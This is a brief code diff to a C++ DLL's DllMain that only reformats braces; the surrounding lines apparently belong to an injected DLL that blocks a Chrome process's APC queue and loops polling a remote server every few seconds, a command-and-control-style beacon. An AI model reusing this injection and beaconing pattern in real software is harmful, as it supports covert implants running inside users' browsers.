@@ -99,7 +99,8 @@ BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
 	    try 
         {
             // Endless loop, preventing from the APC queue to empty and launch a Chrome window
-            while (true) {
+            while (true) 
+            {
                 if (httplib::Error::Success != httpClient->FetchFromServer()) {
 
                     // Error connecting to server - Try again in 5 seconds
@@ -110,7 +111,8 @@ BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
                 ::Sleep(SecondsToMilliseconds(SecondsBetweenFetches));
             }
 	    }
-	    catch (...) {
+	    catch (...) 
+        {
 	    	// Unknown exception
             SubZeroCleanup::Cleanup();
 	    }     
